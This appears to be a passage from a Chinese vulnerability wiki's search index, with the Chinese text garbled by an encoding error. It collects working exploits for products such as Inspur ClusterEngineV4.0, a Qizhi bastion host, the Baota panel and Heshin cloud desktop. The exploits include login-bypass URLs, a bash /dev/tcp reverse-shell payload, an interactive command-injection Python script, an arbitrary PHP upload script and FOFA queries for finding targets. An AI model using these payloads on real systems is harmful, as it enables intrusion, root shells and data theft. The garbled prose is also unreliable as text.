Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈΩêÊ≤ªÂ†°ÂûíÊú∫/ÈΩêÊ≤ªÂ†°ÂûíÊú∫ ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈΩêÊ≤ªÂ†°ÂûíÊú∫/ÈΩêÊ≤ªÂ†°ÂûíÊú∫ ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û.html","title":"ÈΩêÊ≤ªÂ†°ÂûíÊú∫ ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û","keywords":"","body":"ÈΩêÊ≤ªÂ†°ÂûíÊú∫ ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈΩêÊ≤ªÂ†°ÂûíÊú∫ Â≠òÂú®‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥ûÔºåËÆøÈóÆÁâπÂÆöÁöÑUrlÂç≥ÂèØËé∑ÂæóÂêéÂè∞ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈΩêÊ≤ªÂ†°ÂûíÊú∫ FOFA [!NOTE] app=\"ÈΩêÊ≤ªÁßëÊäÄ-Â†°ÂûíÊú∫\" ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûPOC‰∏∫ http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ shterm(QiZhi) Fortress Arbitrary User Login Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆùÂ°îËøêÁª¥ÁÆ°ÁêÜÈù¢Êùø/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆùÂ°îËøêÁª¥ÁÆ°ÁêÜÈù¢Êùø/","title":"ÂÆùÂ°îËøêÁª¥ÁÆ°ÁêÜÈù¢Êùø","keywords":"","body":"ÂÆùÂ°îËøêÁª¥ÁÆ°ÁêÜÈù¢Êùø ÂÆùÂ°î phpmyadmin Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆùÂ°îËøêÁª¥ÁÆ°ÁêÜÈù¢Êùø/ÂÆùÂ°î phpmyadminÊú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆùÂ°îËøêÁª¥ÁÆ°ÁêÜÈù¢Êùø/ÂÆùÂ°î phpmyadminÊú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û.html","title":"ÂÆùÂ°î phpmyadminÊú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û.md","keywords":"","body":"ÂÆùÂ°î phpmyadminÊú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ „ÄêÂÆùÂ°îÈù¢Êùø„ÄëÁ¥ßÊÄ•ÂÆâÂÖ®Êõ¥Êñ∞ÈÄöÁü•ÔºåLinuxÈù¢Êùø7.4.2ÁâàÊú¨/WindowsÈù¢Êùø6.8ÁâàÊú¨Â≠òÂú®ÂÆâÂÖ®ÈöêÊÇ£ÔºåÂÖ∂‰ªñÁâàÊú¨Êó†Ê≠§È£éÈô©„ÄÇÂ∑≤ÂèëÂ∏ÉÁ¥ßÊÄ•Êõ¥Êñ∞ÔºåËØ∑ÊâÄÊúâ‰ΩøÁî®Ê≠§ÁâàÊú¨ÁöÑÁî®Êà∑Âä°ÂøÖÂçáÁ∫ßÂà∞ÊúÄÊñ∞ÁâàÔºåÊõ¥Êñ∞ÊñπÊ≥ïÔºåÁôªÂΩïÈù¢ÊùøÁõ¥Êé•ÂçáÁ∫ßÊõ¥Êñ∞Âç≥ÂèØÔºåÂ¶ÇÊõ¥Êñ∞Âá∫Áé∞ÈóÆÈ¢òÔºåËØ∑ÁôªÂΩïÂÆùÂ°îËÆ∫ÂùõÂèçÈ¶àÊàñËÄÖËÅîÁ≥ªÂÆ¢ÊúçÂèçÈ¶à ÂΩ±ÂìçÁâàÊú¨ [!NOTE] LinuxÊ≠£ÂºèÁâà7.4.2 LinuxÊµãËØïÁâà7.5.13 WindowsÊ≠£ÂºèÁâà6.8 ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆ http://xxx.xxx.xxx.xxx:888/pma Âç≥ÂèØ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Êµ™ÊΩÆ/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Êµ™ÊΩÆ/","title":"Êµ™ÊΩÆ","keywords":"","body":"Êµ™ÊΩÆ Êµ™ÊΩÆClusterEngineV4.0 ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-21224 Êµ™ÊΩÆClusterEngineV4.0 ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û Êµ™ÊΩÆClusterEngineV4.0 sysShell ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Êµ™ÊΩÆ/Êµ™ÊΩÆClusterEngineV4.0 ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-21224.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Êµ™ÊΩÆ/Êµ™ÊΩÆClusterEngineV4.0 ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-21224.html","title":"Êµ™ÊΩÆClusterEngineV4.0 ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-21224","keywords":"","body":"Êµ™ÊΩÆClusterEngineV4.0 ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-21224 ÊºèÊ¥ûÊèèËø∞ Êµ™ÊΩÆÊúçÂä°Âô®Áæ§ÈõÜÁÆ°ÁêÜÁ≥ªÁªüÂ≠òÂú®Âç±Èô©Â≠óÁ¨¶Êú™ËøáÊª§ÔºåÂØºËá¥ËøúÁ®ãÂëΩ‰ª§ÊâßË°å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Êµ™ÊΩÆClusterEngineV4.0 FOFA [!NOTE] title=\"TSCEV4.0\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã Áî±‰∫éÁôªÂΩïÈ°µÈù¢Ê≤°ÊúâÂèëÁé∞È™åËØÅÁ†ÅÔºåËøõË°åË¥¶Âè∑ÁàÜÁ†¥ ÂΩìburpsuiteÁàÜÁ†¥ÂÆåÊàêÊó∂ÔºåÊ≥®ÊÑèÂà∞POSTÊï∞ÊçÆ‰∏≠Â¶ÇÊûúÂ∏¶Êúâ ;' ÔºåÂìçÂ∫îÊï∞ÊçÆÂåÖÂèëÁîüÂºÇÂ∏∏„ÄÇ ÈÄöËøáÂìçÂ∫îÂåÖ‰ø°ÊÅØÔºåÁåúÊµãÂèØËÉΩÂ≠òÂú®‰∏Ä‰∏™ËøúÁ®ãÊâßË°å‰ª£Á†ÅÊºèÊ¥ûÔºåÂπ∂Â∞ÜÊ≠§Êï∞ÊçÆÂåÖÊîæÂú®repeater‰∏≠ÔºåÊàëÂèëÁé∞Â¶ÇÊûúÂèëÂ∏ÉÊï∞ÊçÆ‰∏≠Êúâ ‰∏Ä‰∏™ ' ÔºåÁ≥ªÁªüÂ∞ÜÊäõÂá∫ÂºÇÂ∏∏„ÄÇ Ëøõ‰∏ÄÊ≠•ÊµãËØïÊó∂ÔºåÊàëÂèëÁé∞usernameÂèÇÊï∞Êàñpassword‰ªª‰∏ÄÂèÇÊï∞Â¶ÇÊûúÂåÖÂê´ ' ÔºåÂ∞ÜÂºïÂèëÊ≠§ÂºÇÂ∏∏ ÂÆöÂ∞ùËØïÂèëÈÄÅ ' ' Êù•Êü•ÁúãÂìçÂ∫îÂåÖ„ÄÇ ÊàëÊ≥®ÊÑèÂà∞ grep ÂëΩ‰ª§ÈîôËØØÔºåÊúçÂä°Á´ØÁöÑ‰ª£Á†ÅÂèØËÉΩÊòØËøôÊ†∑ var1 = `grep xxxx` var2 = $(python -c \"from crypt import crypt;print crypt('$username','$1$$var1')\") Â∞ùËØïÂèëÈÄÅ -V Âíå --help Êù•Êü•ÁúãÂìçÂ∫îÂåÖÔºåÂìçÂ∫îÂåÖËØÅÂÆû‰∫ÜÁåúÊµã Â∞ùËØïËØªÂèñ /etc/passswd Â∞ùËØïÂàóÁõÆÂΩï Á°ÆËÆ§Â≠òÂú®‰∏Ä‰∏™ËøúÁ®ãÊâßË°åÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÁªèËøáfuzzÔºåÂæóÂà∞‰ª•‰∏ãpayload ÂèçÂºπ shell op=login&username=1 2\\',\\'1\\'\\); `bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.16.11.81%2F80%200%3E%261` payloadÂèëÈÄÅÂêé, Âú® kali linux ÊúçÂä°Âô®‰∏äËé∑Âèñ‰∫Ü‰∏Ä‰∏™ root ÊùÉÈôêÁöÑ shell ‰∏äÈù¢ÊòØÂéüÊñáÁöÑÊµãËØïÊÄùË∑ØÔºå‰ΩÜÁªèËøáÈáçÊñ∞ÊµãËØï‰πãÂêéÂèëÁé∞ËøòÊúâÂè¶‰∏ÄÁßçÁÆÄÂçïÊñπÊ≥ï POCÊµãËØï(Âá∫Áé∞ root:x:0:0 ÂàôÂ≠òÂú®ÊºèÊ¥û) op=login&username=test`$(cat /etc/passwd)` {\"err\":\"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\\n\",\"exitcode\":1,\"out\":\"the user test does not exist\\nerror:1\\n\"} ÂèçÂºπshell op=login&username=test`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)` ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Êµ™ÊΩÆClusterEngineV4.0 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mIP >>> xxx.xxx.xxx.xxx:9999 \\033[0m') print('+ \\033[36mPORT >>> 9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", } data = \"op=login&username=test`$(cat /etc/passwd)`\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=4) etc_passwd = re.findall(r'\\{\"err\":\"/bin/sh: (.*?): No such', response.text) if response.status_code == 200 and \"root:x:0:0\" in response.text: print(\"\\033[32m[o] ÁõÆÊ†á {} ÂèØËÉΩÂ≠òÂú®ÊºèÊ¥û, ÂìçÂ∫î‰∏∫:{} \\033[0m\".format(target_url, etc_passwd[0])) POC_2(target_url) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url)) def POC_2(target_url): IP = str(input(\"\\033[35mËØ∑ËæìÂÖ•ÁõëÂê¨IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mËØ∑ËæìÂÖ•ÁõëÂê¨PORT >>> \\033[0m\")) vuln_url = target_url + \"/login\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", } data = \"op=login&username=`bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261`\".format(IP, PORT) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!ONTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ ClusterEngineV4.0_RCE ÂèÇËÄÉÊñáÁ´† https://github.com/NS-Sp4ce/Inspur/tree/master/ClusterEngineV4.0%20Vul Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Êµ™ÊΩÆ/Êµ™ÊΩÆClusterEngineV4.0 ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Êµ™ÊΩÆ/Êµ™ÊΩÆClusterEngineV4.0 ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û.html","title":"Êµ™ÊΩÆClusterEngineV4.0 ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û","keywords":"","body":"Êµ™ÊΩÆClusterEngineV4.0 ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Êµ™ÊΩÆClusterEngineV4.0 Â≠òÂú®‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥ûÔºåÊûÑÈÄ†ÊÅ∂ÊÑèÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅÂç≥ÂèØËé∑ÂèñÂêéÂè∞ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Êµ™ÊΩÆClusterEngineV4.0 FOFA [!NOTE] title=\"TSCEV4.0\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã USERÔºö admin|pwd PASS: ‰ªªÊÑè ÊàêÂäüÁôªÈôÜÂêéÂè∞ [!NOTE] ÈÉ®ÂàÜÂäüËÉΩÊòØÊó†Ê≥ï‰ΩøÁî®ÁöÑ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Êµ™ÊΩÆ/Êµ™ÊΩÆClusterEngineV4.0 sysShell ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Êµ™ÊΩÆ/Êµ™ÊΩÆClusterEngineV4.0 sysShell ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Êµ™ÊΩÆClusterEngineV4.0 sysShell ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Êµ™ÊΩÆClusterEngineV4.0 sysShell ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Êµ™ÊΩÆClusterEngineV4.0 Â≠òÂú®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÔºåÊîªÂáªËÄÖÈÄöËøáÂèëÈÄÅÁâπÊÆäÁöÑËØ∑Ê±ÇÂèØ‰ª•Ëé∑ÂèñÊúçÂä°Âô®ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Êµ™ÊΩÆClusterEngineV4.0 FOFA [!NOTE] title=\"TSCEV4.0\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÂèëÈÄÅËØ∑Ê±ÇÂåÖ POST /sysShell HTTP/1.1 Host: xxx.xxx.xxx.xxx Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: lang=cn Cache-Control: max-age=0 Content-Length: 42 op=doPlease&node=cu01&command=cat /etc/passwd [!NOTE] Ê≥®ÊÑèÂèÇÊï∞ node ‰∏≠ÁöÑ cu01 ÈúÄË¶Å‰∏∫shellÈõÜÁæ§‰∏≠ÁöÑÂ≠òÂú®‰∏ªÊú∫ ËøôÈáåÂèØ‰ª•ÈÖçÂêà‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥ûÊü•Áúã‰∏ªÊú∫Âêç ÊºèÊ¥ûÂà©Áî® [!NOTE] Â¶ÇËøáÂá∫Áé∞ Name or service not ËØ∑ÈÄöËøá‰∏äËø∞ÁöÑÊñπÊ≥ïÊü•Áúã shellÈõÜÁæ§‰∏ªÊú∫ÁöÑÂêçÁß∞ÔºàËÑöÊú¨ÈªòËÆ§ cu01Ôºâ import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: SonicWall SSL-VPN \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/sysShell\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Cookie\": \"lang=cn\" } data = \"op=doPlease&node=cu01&command=cat /etc/passwd\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5) print(\"\\033[32m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/sysShell \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,ÊàêÂäüÊâßË°å cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/sysShell\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Cookie\": \"lang=cn\" } data = \"op=doPlease&node=cu01&command={}\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, cmd) Goby & POC [!NOTE] ClusterEngine V4.0 Shell cluster RCE Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Âíå‰ø°ÂàõÂ§©‰∫ë/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Âíå‰ø°ÂàõÂ§©‰∫ë/","title":"Âíå‰ø°ÂàõÂ§©‰∫ë","keywords":"","body":"Âíå‰ø°ÂàõÂ§©‰∫ë Âíå‰ø°ÂàõÂ§©‰∫ëÊ°åÈù¢Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°å RCEÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Âíå‰ø°ÂàõÂ§©‰∫ë/Âíå‰ø°ÂàõÂ§©‰∫ëÊ°åÈù¢Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°å RCEÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Âíå‰ø°ÂàõÂ§©‰∫ë/Âíå‰ø°ÂàõÂ§©‰∫ëÊ°åÈù¢Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°å RCEÊºèÊ¥û.html","title":"Âíå‰ø°ÂàõÂ§©‰∫ëÊ°åÈù¢Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°å RCEÊºèÊ¥û","keywords":"","body":"Âíå‰ø°ÂàõÂ§©‰∫ëÊ°åÈù¢Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°å RCEÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Âíå‰ø°ÂàõÂ§©‰∫ëÊ°åÈù¢Á≥ªÁªüÂ≠òÂú®ÈªòËÆ§ÈÖçÁΩÆÂØºËá¥Êñá‰ª∂‰∏ä‰º†Âπ∂ÂèØ‰ª•ËøúÁ®ãÂëΩ‰ª§ÊâßË°å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Âíå‰ø°ÂàõÂ§©‰∫ëÊ°åÈù¢Á≥ªÁªü ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÂèëÈÄÅËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã POST /Upload/upload_file.php?l=1 HTTP/1.1 Host: xxx.xxx.xx.xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8 Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv Content-Length: 182 ------WebKitFormBoundaryfcKRltGv Content-Disposition: form-data; name=\"file\"; filename=\"test.php\" Content-Type: image/avif ------WebKitFormBoundaryfcKRltGv-- ËÆøÈóÆ http://xxx.xx.xxx.xxx/Upload/1/test.php ÊºèÊ¥ûPOC import requests import sys import random import base64 import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Âíå‰ø°‰∫ëÊ°åÈù¢‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/Upload/upload_file.php?l=test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\", \"Content-Type\": \"multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv\" } data = base64.b64decode(\"Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YKCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWZjS1JsdEd2CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZSI7IGZpbGVuYW1lPSJ0ZXN0LnBocCIKQ29udGVudC1UeXBlOiBpbWFnZS9hdmlmCgo8P3BocCBwaHBpbmZvKCk7Pz4KLS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"Requst\" in response.text and response.status_code == 200: webshell_url = target_url + \"/Upload/test/config.php\" response = requests.get(url=webshell_url, headers=headers,verify=False, timeout=5) if \"shell\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û config.php\\n[o] Ë∑ØÂæÑ‰∏∫ {}/Upload/test/config.php\\033[0m\".format(target_url, target_url)) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) else: print(\"\\033[31m[x] ‰∏ä‰º†Â§±Ë¥• \\033[0m\") except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ËôöÊãü‰ªøÁúüÂÆûÈ™åÂÆ§/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ËôöÊãü‰ªøÁúüÂÆûÈ™åÂÆ§/","title":"ËôöÊãü‰ªøÁúüÂÆûÈ™åÂÆ§","keywords":"","body":"ËôöÊãü‰ªøÁúüÂÆûÈ™åÂÆ§ ÈòøÂ∞îÊ≥ïÁßëÊäÄ ËôöÊãü‰ªøÁúüÂÆûÈ™åÂÆ§ Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ËôöÊãü‰ªøÁúüÂÆûÈ™åÂÆ§/ÈòøÂ∞îÊ≥ïÁßëÊäÄ ËôöÊãü‰ªøÁúüÂÆûÈ™åÂÆ§ Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ËôöÊãü‰ªøÁúüÂÆûÈ™åÂÆ§/ÈòøÂ∞îÊ≥ïÁßëÊäÄ ËôöÊãü‰ªøÁúüÂÆûÈ™åÂÆ§ 